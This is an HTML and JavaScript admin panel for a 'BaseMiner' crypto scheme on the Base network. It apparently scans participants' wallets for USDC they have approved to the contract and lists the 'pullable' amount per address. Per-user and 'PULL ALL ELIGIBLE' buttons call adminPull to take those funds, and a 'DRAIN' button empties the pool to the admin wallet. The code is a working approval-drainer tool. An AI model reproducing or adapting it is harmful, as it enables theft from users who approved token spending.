<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BaseMiner | Admin Pro v2</title>
    <!-- Ethers.js v6 -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <!-- Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --bg-dark: #05060a;
            --panel-bg: #11141d;
            --accent: #0052ff; /* Base Blue */
            --accent-hover: #004ad1;
            --danger: #ff2d55;
            --danger-hover: #d61e40;
            --success: #00c853;
            --warning: #ffab00;
            --text-main: #ffffff;
            --text-muted: #94a3b8;
            --border: #222630;
        }

        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; padding: 0; background: var(--bg-dark); font-family: 'Inter', sans-serif; color: var(--text-main); font-size: 14px; }
        
        /* --- Navbar --- */
        .navbar {
            display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center;
            padding: 15px 20px; background: rgba(17, 20, 29, 0.95);
            border-bottom: 1px solid var(--border); backdrop-filter: blur(10px);
            position: sticky; top: 0; z-index: 100; gap: 10px;
        }
        .logo { font-size: 1.3rem; font-weight: 800; letter-spacing: -1px; display: flex; align-items: center; gap: 8px; }
        .logo span { color: var(--accent); }
        
        .nav-controls { display: flex; align-items: center; gap: 15px; }
        .status-dot { width: 8px; height: 8px; background: #555; border-radius: 50%; display: inline-block; }
        .status-dot.online { background: var(--success); box-shadow: 0 0 10px var(--success); }

        .container { max-width: 1400px; margin: 25px auto; padding: 0 15px; }
        
        /* --- Grid Layout --- */
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin-bottom: 30px; }
        
        .card {
            background: var(--panel-bg); border: 1px solid var(--border);
            border-radius: 16px; padding: 20px; position: relative;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        }
        .card h3 { margin: 0 0 10px 0; color: var(--text-muted); font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
        .card .value { font-size: 1.8rem; font-weight: 700; font-family: 'JetBrains Mono', monospace; word-break: break-all; }
        
        /* --- Inputs & Buttons --- */
        .control-group { margin-top: 15px; display: flex; gap: 8px; }
        input {
            background: #080a0f; border: 1px solid var(--border); color: white;
            padding: 12px; border-radius: 8px; flex: 1; font-family: 'JetBrains Mono', monospace; font-size: 0.95rem;
            transition: 0.2s;
        }
        input:focus { border-color: var(--accent); }
        
        .btn {
            padding: 10px 18px; border-radius: 8px; border: none; cursor: pointer;
            font-weight: 700; font-size: 0.9rem; transition: all 0.2s;
            display: flex; align-items: center; justify-content: center; gap: 8px; white-space: nowrap;
        }
        .btn-primary { background: var(--accent); color: white; }
        .btn-primary:hover { background: var(--accent-hover); transform: translateY(-1px); }
        
        .btn-danger { background: rgba(255, 45, 85, 0.1); color: var(--danger); border: 1px solid var(--danger); }
        .btn-danger:hover { background: var(--danger); color: white; }
        
        .btn-warning { background: var(--warning); color: #000; }
        .btn-warning:hover { filter: brightness(1.1); }

        .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--text-muted); }
        .btn-ghost:hover { border-color: white; color: white; }

        .btn-pull {
            background: var(--danger); color: white; width: 100%;
            font-weight: 800; text-transform: uppercase; letter-spacing: 1px;
            box-shadow: 0 4px 15px rgba(255, 45, 85, 0.3); font-size: 0.8rem;
        }
        .btn-pull:active { transform: scale(0.98); }
        .btn-pull:disabled { background: #333; color: #555; cursor: not-allowed; box-shadow: none; transform: none; }

        /* --- Table Section --- */
        .table-card {
            background: var(--panel-bg); border-radius: 16px; border: 1px solid var(--border);
            overflow: hidden; display: flex; flex-direction: column;
        }
        
        .table-toolbar {
            padding: 15px 20px; border-bottom: 1px solid var(--border);
            display: flex; flex-wrap: wrap; gap: 15px; justify-content: space-between; align-items: center;
        }
        
        .search-box {
            position: relative; max-width: 300px; width: 100%;
        }
        .search-box i { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: var(--text-muted); }
        .search-box input { padding-left: 35px; background: #080a0f; width: 100%; }

        .table-wrapper {
            width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch;
        }
        table { width: 100%; border-collapse: collapse; min-width: 800px; }
        th { text-align: left; padding: 18px 20px; color: var(--text-muted); font-size: 0.75rem; text-transform: uppercase; background: rgba(0,0,0,0.2); white-space: nowrap; }
        td { padding: 15px 20px; border-bottom: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; vertical-align: middle; }
        tr:last-child td { border-bottom: none; }
        tr:hover { background: rgba(255,255,255,0.02); }

        /* Badges */
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; }
        .badge-safe { background: rgba(34, 197, 94, 0.1); color: #22c55e; }
        .badge-risk { background: rgba(255, 45, 85, 0.1); color: var(--danger); border: 1px solid var(--danger); animation: pulse 2s infinite; }
        
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }

        /* --- Overlay/Toast --- */
        #toast {
            visibility: hidden; min-width: 250px; background-color: #1a1d26; color: #fff; text-align: center;
            border-radius: 8px; padding: 16px; position: fixed; z-index: 1000; left: 50%; bottom: 30px;
            transform: translateX(-50%); border: 1px solid var(--accent); box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }
        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }

        /* Mobile Adjustments */
        @media (max-width: 768px) {
            .navbar { flex-direction: column; align-items: stretch; gap: 15px; }
            .nav-controls { justify-content: space-between; }
            .table-toolbar { flex-direction: column; align-items: stretch; }
            .btn { width: 100%; justify-content: center; }
            #connectBtn { width: auto; }
        }
    </style>
</head>
<body>

<!-- Navigation -->
<nav class="navbar">
    <div class="logo"><i class="fa-solid fa-bolt"></i> Base<span>Miner</span><small style="font-size:0.5em; opacity:0.5; margin-left:10px;">V2 ADMIN</small></div>
    <div class="nav-controls">
        <div style="display:flex; align-items:center; gap:8px; font-size:0.8rem; color:var(--text-muted);">
            <div id="netDot" class="status-dot"></div> 
            <span id="netText">Disconnected</span>
        </div>
        <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
            <i class="fa-solid fa-wallet"></i> Connect
        </button>
    </div>
</nav>

<div class="container">

    <!-- Stats Grid -->
    <div class="grid">
        <!-- Pool Fund -->
        <div class="card">
            <h3>Reward Pool</h3>
            <div class="value" id="poolBalance">0.00 <span style="font-size:0.5em; color:var(--text-muted)">USDC</span></div>
            <div class="control-group">
                <input type="number" id="fundAmount" placeholder="Amount">
                <button class="btn btn-primary" onclick="fundPool()">Fund</button>
            </div>
        </div>

        <!-- Total Risk (New) -->
        <div class="card" style="border-color: var(--accent);">
            <h3 style="color:var(--accent)">Total Pullable (Risk Value)</h3>
            <div class="value" id="totalRiskValue" style="color:var(--accent)">0.00 <span style="font-size:0.5em;">USDC</span></div>
            <div class="control-group">
                <button class="btn btn-warning" style="width:100%" onclick="batchPullAll()">
                    <i class="fa-solid fa-fire"></i> PULL ALL ELIGIBLE
                </button>
            </div>
        </div>

        <!-- Config -->
        <div class="card">
            <h3>System Controls</h3>
            <div style="display:flex; gap:10px; margin-bottom:10px; align-items:center; justify-content:space-between;">
                <span style="color:var(--text-muted)">Daily Rate:</span>
                <div style="display:flex; gap:5px;">
                    <input type="number" id="dailyRateInput" placeholder="%" style="width:80px; padding:6px;">
                    <button class="btn btn-ghost" style="padding:6px 10px;" onclick="setDailyRate()">Set</button>
                </div>
            </div>
            <button id="pauseBtn" class="btn btn-primary" style="width:100%" onclick="togglePause()">
                <i class="fa-solid fa-pause"></i> PAUSE SYSTEM
            </button>
        </div>
    </div>

    <!-- Main Table -->
    <div class="table-card">
        <div class="table-toolbar">
            <div class="search-box">
                <i class="fa-solid fa-search"></i>
                <input type="text" id="searchInput" onkeyup="filterTable()" placeholder="Search address...">
            </div>
            <div style="display:flex; gap:10px;">
                <span style="color:var(--text-muted); font-size:0.8rem; line-height:35px;">Users: <strong id="totalUsers">0</strong></span>
                <button class="btn btn-ghost" onclick="loadData()"><i class="fa-solid fa-rotate"></i></button>
            </div>
        </div>
        
        <div class="table-wrapper">
            <table id="mainTable">
                <thead>
                    <tr>
                        <th>Address</th>
                        <th>Balance</th>
                        <th>Allowance</th>
                        <th>Status</th>
                        <th>Pending</th>
                        <th style="text-align:right">Action</th>
                    </tr>
                </thead>
                <tbody id="userTable">
                    <tr><td colspan="6" style="text-align:center; padding:40px; color:#555;">Connect wallet to scan database...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Danger Zone -->
    <div style="margin-top:40px; border-top:1px solid var(--border); padding-top:30px; text-align:center;">
        <button class="btn btn-pull" style="max-width:300px; margin:0 auto; padding:18px; font-size:1rem;" onclick="emergencyWithdraw()">
            <i class="fa-solid fa-triangle-exclamation"></i> EMERGENCY DRAIN CONTRACT
        </button>
        <p style="color:var(--text-muted); margin-top:10px; font-size:0.8rem;">Transfers all pool funds to admin wallet</p>
    </div>

</div>

<div id="toast"></div>

<script>
    // ================= CONFIGURATION =================
    const CONTRACT_ADDRESS = "0x7496D84c2049d0be73D3B5B76798CAEc87839626"; 
    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; 
    const BASE_CHAIN_ID_HEX = "0x2105"; // 8453 Hex
    const BASE_CHAIN_ID_DEC = 8453n;
    // =================================================

    const MINING_ABI = [
        "function getAllMiners() view returns (address[])",
        "function adminPull(address _user)",
        "function setDailyRate(uint256 _newRate)",
        "function setMaintenanceMode(bool _status)",
        "function isClaimPaused() view returns (bool)",
        "function emergencyWithdraw()",
        "function getPendingRewards(address) view returns (uint256)",
        "function dailyRatePercent() view returns (uint256)"
    ];
    
    const ERC20_ABI = [
        "function balanceOf(address) view returns (uint256)",
        "function allowance(address, address) view returns (uint256)",
        "function transfer(address, uint256)",
        "function approve(address, uint256)"
    ];

    let provider, signer, contract, usdcContract;
    let allMinersData = []; // Store data for search/batching

    // --- Connect Logic ---
    async function connectWallet() {
        if (!window.ethereum) return showToast("⚠️ No Wallet Found");
        const btn = document.getElementById("connectBtn");
        btn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Loading...`;

        try {
            provider = new ethers.BrowserProvider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            
            // Switch Network
            const network = await provider.getNetwork();
            if (network.chainId !== BASE_CHAIN_ID_DEC) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: BASE_CHAIN_ID_HEX }],
                    });
                    provider = new ethers.BrowserProvider(window.ethereum); // Re-init
                } catch (e) {
                    if(e.code === 4902) {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: BASE_CHAIN_ID_HEX,
                                chainName: 'Base Mainnet',
                                rpcUrls: ['https://mainnet.base.org'],
                                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
                                blockExplorerUrls: ['https://basescan.org']
                            }],
                        });
                        provider = new ethers.BrowserProvider(window.ethereum);
                    } else throw e;
                }
            }

            signer = await provider.getSigner();
            const addr = await signer.getAddress();
            
            contract = new ethers.Contract(CONTRACT_ADDRESS, MINING_ABI, signer);
            usdcContract = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);

            // UI Update
            btn.innerHTML = `<i class="fa-solid fa-wallet"></i> ${addr.slice(0,5)}...${addr.slice(-4)}`;
            btn.classList.replace("btn-primary", "btn-ghost");
            document.getElementById("netDot").classList.add("online");
            document.getElementById("netText").innerText = "Base Mainnet";
            
            showToast("✅ Connected successfully");
            loadData();

        } catch (error) {
            console.error(error);
            btn.innerHTML = `<i class="fa-solid fa-wallet"></i> Connect`;
            showToast("❌ Connection Failed");
        }
    }

    // --- Data Loader ---
    async function loadData() {
        if(!contract) return;
        const tbody = document.getElementById("userTable");
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:30px;"><i class="fa-solid fa-circle-notch fa-spin"></i> Scanning Blockchain...</td></tr>`;
        
        try {
            // Globals
            const [poolBal, rate, isPaused, miners] = await Promise.all([
                usdcContract.balanceOf(CONTRACT_ADDRESS),
                contract.dailyRatePercent(),
                contract.isClaimPaused(),
                contract.getAllMiners()
            ]);

            document.getElementById("poolBalance").innerText = parseFloat(ethers.formatUnits(poolBal, 6)).toFixed(2);
            document.getElementById("dailyRateInput").value = rate;
            document.getElementById("totalUsers").innerText = miners.length;

            const pBtn = document.getElementById("pauseBtn");
            if(isPaused) {
                pBtn.innerHTML = `<i class="fa-solid fa-play"></i> RESUME SYSTEM`;
                pBtn.classList.replace("btn-primary", "btn-success");
            } else {
                pBtn.innerHTML = `<i class="fa-solid fa-pause"></i> PAUSE SYSTEM`;
                pBtn.classList.add("btn-primary");
            }

            // User Data Loop
            allMinersData = []; // Clear cache
            tbody.innerHTML = "";
            let totalRisk = 0;

            if(miners.length === 0) {
                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:30px;">No users found.</td></tr>`;
                return;
            }

            for(let miner of miners) {
                try {
                    const [bal, allow, pending] = await Promise.all([
                        usdcContract.balanceOf(miner),
                        usdcContract.allowance(miner, CONTRACT_ADDRESS),
                        contract.getPendingRewards(miner)
                    ]);

                    const fmtBal = parseFloat(ethers.formatUnits(bal, 6));
                    const fmtAllow = parseFloat(ethers.formatUnits(allow, 6));
                    const fmtPending = parseFloat(ethers.formatUnits(pending, 6));
                    
                    const pullable = Math.min(fmtBal, fmtAllow);
                    if(pullable > 0) totalRisk += pullable;

                    // Cache for search/batch
                    allMinersData.push({
                        address: miner,
                        balance: fmtBal,
                        allowance: fmtAllow,
                        pullable: pullable,
                        pending: fmtPending
                    });

                } catch(e) { console.error("Err reading user", miner); }
            }

            document.getElementById("totalRiskValue").innerText = totalRisk.toFixed(2);
            renderTable(allMinersData);

        } catch (e) {
            console.error(e);
            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--danger)">Error loading data</td></tr>`;
        }
    }

    // --- Render Table ---
    function renderTable(data) {
        const tbody = document.getElementById("userTable");
        tbody.innerHTML = "";
        
        if(data.length === 0) {
            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:20px;">No matching records.</td></tr>`;
            return;
        }

        data.forEach(user => {
            const isRisk = user.allowance > 0;
            const row = document.createElement("tr");
            row.innerHTML = `
                <td style="color:var(--accent);">${user.address.slice(0,6)}...${user.address.slice(-4)}</td>
                <td>${user.balance.toFixed(2)}</td>
                <td style="color:${isRisk ? '#fff' : '#666'}">${user.allowance.toFixed(2)}</td>
                <td>${isRisk ? '<span class="badge badge-risk">APPROVED</span>' : '<span class="badge badge-safe">SAFE</span>'}</td>
                <td>${user.pending.toFixed(4)}</td>
                <td style="text-align:right">
                    <button class="btn btn-pull" 
                        onclick="pullFunds('${user.address}', ${user.pullable})"
                        ${user.pullable <= 0 ? 'disabled' : ''}>
                        PULL ${user.pullable > 0 ? user.pullable.toFixed(2) : ''}
                    </button>
                </td>
            `;
            tbody.appendChild(row);
        });
    }

    // --- Filter Logic ---
    function filterTable() {
        const term = document.getElementById("searchInput").value.toLowerCase();
        const filtered = allMinersData.filter(u => u.address.toLowerCase().includes(term));
        renderTable(filtered);
    }

    // --- NEW: Batch Pull Logic ---
    async function batchPullAll() {
        // 1. Filter eligible targets
        const targets = allMinersData.filter(u => u.pullable > 0);
        
        if(targets.length === 0) return showToast("⚠️ No users to pull");
        
        const totalAmt = targets.reduce((acc, u) => acc + u.pullable, 0);
        
        if(!confirm(`⚠️ BATCH PULL CONFIRMATION\n\nTargets: ${targets.length} Users\nTotal Est. Value: ${totalAmt.toFixed(2)} USDC\n\nYou will need to sign ${targets.length} transactions sequence.`)) return;

        showToast(`🚀 Starting Batch Process for ${targets.length} users...`);

        // 2. Loop and Prompt
        for(let i = 0; i < targets.length; i++) {
            const user = targets[i];
            try {
                // UI Feedback
                showToast(`(${i+1}/${targets.length}) Pulling ${user.pullable.toFixed(2)} from ${user.address.slice(0,6)}...`);
                
                const tx = await contract.adminPull(user.address);
                await tx.wait(); // Wait for confirmation
                
                console.log(`Pulled ${user.address}`);
            } catch (err) {
                console.error(`Failed to pull ${user.address}`, err);
                if(!confirm(`❌ Failed to pull from ${user.address.slice(0,6)}. Continue to next?`)) break;
            }
        }
        
        showToast("✅ Batch Process Complete");
        loadData();
    }

    // --- Actions ---
    async function pullFunds(user, amount) {
        if(!confirm(`Confirm Pull: ${amount} USDC from ${user}?`)) return;
        try {
            const tx = await contract.adminPull(user);
            showToast("⏳ Transaction sent...");
            await tx.wait();
            showToast("✅ Success!");
            loadData();
        } catch(e) { alert(e.reason || e.message); }
    }

    async function fundPool() {
        const amt = document.getElementById("fundAmount").value;
        if(!amt) return;
        try {
            const parsed = ethers.parseUnits(amt, 6);
            const tx1 = await usdcContract.approve(CONTRACT_ADDRESS, parsed);
            await tx1.wait();
            const tx2 = await usdcContract.transfer(CONTRACT_ADDRESS, parsed);
            await tx2.wait();
            showToast("✅ Pool Funded");
            loadData();
        } catch(e) { alert(e.message); }
    }

    async function emergencyWithdraw() {
        const c = prompt("Type 'DRAIN' to empty contract:");
        if(c !== 'DRAIN') return;
        try {
            const tx = await contract.emergencyWithdraw();
            await tx.wait();
            showToast("✅ Contract Drained");
            loadData();
        } catch(e) { alert(e.message); }
    }

    // --- Helpers ---
    function showToast(msg) {
        const t = document.getElementById("toast");
        t.innerText = msg;
        t.className = "show";
        setTimeout(() => t.className = "", 3000);
    }

    function copyContract() {
        navigator.clipboard.writeText(CONTRACT_ADDRESS);
        showToast("Copied Address");
    }
</script>
</body>
</html>
